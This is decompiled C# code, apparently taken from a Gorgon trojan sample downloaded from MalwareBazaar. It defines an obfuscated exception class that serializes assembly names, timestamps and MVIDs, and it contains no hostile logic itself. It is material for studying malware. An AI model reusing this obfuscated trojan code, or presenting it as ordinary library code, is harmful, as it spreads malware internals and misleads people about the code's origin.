// Decompiled with JetBrains decompiler
// Type: BgpSbMK.wTVtkiH
// Assembly: gO77Fih, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: F43F05C3-DF79-4EF2-8C94-619BF1ED6D3E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Gorgon.gen-83f6c309f411e1aebbdf75c62f67f163231f1b0ee065936230741272cda1cb9a.exe

using \u00366N2IhJ;
using System;
using System.Globalization;
using System.Reflection;
using System.Runtime.Serialization;
using System.Security.Permissions;

namespace BgpSbMK
{
  [Serializable]
  public class wTVtkiH : Exception
  {
    private static readonly string cSLuToz = MykOU9k.\u003347VEXL;

    public wTVtkiH(
      AssemblyName assemblyName = null,
      long expectedTimestamp = 0,
      long actualTimestamp = 0,
      Guid expectedMvid = default (Guid),
      Guid actualMvid = default (Guid))
      : this(string.Empty, assemblyName, expectedTimestamp, actualTimestamp, expectedMvid, actualMvid)
    {
    }

    public wTVtkiH(
      string message,
      AssemblyName assemblyName = null,
      long expectedTimestamp = 0,
      long actualTimestamp = 0,
      Guid expectedMvid = default (Guid),
      Guid actualMvid = default (Guid))
      : base(string.Format((IFormatProvider) CultureInfo.CurrentCulture, wTVtkiH.cSLuToz + " {1}", (object) (assemblyName?.ToString() ?? "not specified"), (object) message).TrimEnd())
    {
      this.W7YWBEd = assemblyName;
      this.QKZ3f9n = expectedTimestamp;
      this.w8sbUuc = actualTimestamp;
      this.KTAD6I9 = expectedMvid;
      this.lzuSLAn = actualMvid;
    }

    public wTVtkiH(
      string message,
      Exception inner,
      AssemblyName assemblyName = null,
      long expectedTimestamp = 0,
      long actualTimestamp = 0,
      Guid expectedMvid = default (Guid),
      Guid actualMvid = default (Guid))
      : base(string.Format((IFormatProvider) CultureInfo.CurrentCulture, wTVtkiH.cSLuToz + " {1}", (object) (assemblyName?.ToString() ?? "not specified"), (object) message).TrimEnd(), inner)
    {
      this.W7YWBEd = assemblyName;
      this.QKZ3f9n = expectedTimestamp;
      this.w8sbUuc = actualTimestamp;
      this.KTAD6I9 = expectedMvid;
      this.lzuSLAn = actualMvid;
    }

    [SecurityPermission(SecurityAction.Demand, SerializationFormatter = true)]
    protected wTVtkiH(SerializationInfo info, StreamingContext context)
      : base(info, context)
    {
      this.W7YWBEd = new AssemblyName(info.GetString("AssemblyName"));
      this.QKZ3f9n = info.GetInt64("ExpectedTimestamp");
      this.w8sbUuc = info.GetInt64("ActualTimestamp");
      Guid result1;
      if (Guid.TryParse(info.GetString("ExpectedMvid"), out result1))
        this.KTAD6I9 = result1;
      Guid result2;
      if (!Guid.TryParse(info.GetString("ActualMvid"), out result2))
        return;
      this.lzuSLAn = result2;
    }

    public AssemblyName W7YWBEd { get; private set; }

    public long QKZ3f9n { get; private set; }

    public long w8sbUuc { get; private set; }

    public Guid KTAD6I9 { get; private set; }

    public Guid lzuSLAn { get; private set; }

    [SecurityPermission(SecurityAction.Demand, SerializationFormatter = true)]
    public virtual void HFYQGN8(SerializationInfo KxjPGGB, StreamingContext aH4HiLu)
    {
      if (KxjPGGB == null)
        throw new ArgumentNullException("info");
      KxjPGGB.AddValue("AssemblyName", (object) this.W7YWBEd.FullName);
      KxjPGGB.AddValue("ExpectedTimestamp", this.QKZ3f9n);
      KxjPGGB.AddValue("ActualTimestamp", this.w8sbUuc);
      SerializationInfo serializationInfo1 = KxjPGGB;
      Guid ktaD6I9 = this.KTAD6I9;
      string str1 = ktaD6I9.ToString();
      serializationInfo1.AddValue("ExpectedMvid", (object) str1);
      SerializationInfo serializationInfo2 = KxjPGGB;
      ktaD6I9 = this.KTAD6I9;
      string str2 = ktaD6I9.ToString();
      serializationInfo2.AddValue("ActualMvid", (object) str2);
      this.GetObjectData(KxjPGGB, aH4HiLu);
    }
  }
}
